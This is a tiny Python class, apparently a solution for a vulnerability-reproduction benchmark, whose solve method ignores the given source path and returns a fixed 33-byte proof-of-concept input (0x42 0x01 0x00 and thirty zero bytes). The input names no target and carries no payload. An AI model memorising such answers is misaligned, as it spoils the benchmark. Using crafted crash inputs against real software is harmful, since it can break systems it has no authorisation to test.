class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b'\x42\x01\x00' + b'\x00' * 30
        return poc
